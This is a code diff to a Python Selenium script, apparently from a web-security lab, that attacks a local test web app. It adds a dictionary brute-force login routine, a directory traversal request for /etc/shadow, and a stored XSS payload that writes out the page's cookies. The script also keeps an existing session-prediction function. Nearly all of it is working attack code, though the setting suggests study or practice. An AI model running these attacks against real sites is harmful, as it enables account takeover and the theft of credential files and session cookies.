@@ -2,32 +2,56 @@ from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from pyvirtualdisplay import Display
 import pdb
+import re
 import requests
+
+def guess_password(driver):
+    
+    with open("names.txt", "r") as f:
+            names = f.read()
+
+    names = names.split("\n")
+
+    usernames = []
+
+    for name in names:
+        usernames.append(name.replace(" ", "."))
+
+    with open("dictionary.txt") as f:
+        passwords = f.read()
+
+    passwords = passwords.split("\n")
+
+    for user in usernames:
+        for password in passwords:
+
+            print("Trying Username: {} with Password: {}".format(user, password))
+
+            elem = driver.find_element_by_name("username")
+            elem.send_keys(user)
+
+            elem = driver.find_element_by_name("password")
+            elem.send_keys(password)
+
+            elem.send_keys(Keys.RETURN)
+
+            src = driver.page_source
+
+            login_err_found = re.search(r'Wrong username', src)
+            if login_err_found is None:
+                print("Found the password!  Username: {} with Password: {}".format(user, password))
+                return src
+
+    return "Not found"
+
 
 def brute_force_login(driver):
 
-
-
-    # In[10]:
-
     driver.get("http://127.0.0.1:5000/")
 
+    page_text = guess_password(driver)
 
-    # In[11]:
-
-    elem = driver.find_element_by_name("username")
-    elem.send_keys("fish")
-
-    elem = driver.find_element_by_name("password")
-    elem.send_keys("chips")
-
-    elem.send_keys(Keys.RETURN)
-
-    #pdb.set_trace()
-    print(driver.find_element_by_tag_name('body').text)
-
-    # In[16]:
-
+    print(page_text)
 
 
 def sess_pred(driver):
@@ -50,13 +74,33 @@ def sess_pred(driver):
             print(r.text)
 
 
+def directory_transversal(driver):
+
+    url = "http://127.0.0.1:5000/get_file/..%2f/etc/shadow"
+    driver.get(url)
+    r = requests.get(url)
+    print(r.text)
+
+
+def xss_attack(driver):
+    driver.get("http://127.0.0.1:5000/blog")
+    elem = driver.find_element_by_name("post")
+    elem.send_keys("<script>document.write(document.cookie);</script>")
+
+    print(driver.page_source)
+
+
+
+
 display = Display(visible=0, size=(1024, 768))
 display.start()
 # In[9]:
 
 driver = webdriver.Firefox()
-brute_force_login(driver)
+#brute_force_login(driver)
+#directory_transversal(driver)
 #sess_pred(driver)
+xss_attack(driver)
 
 driver.close()
 display.stop()
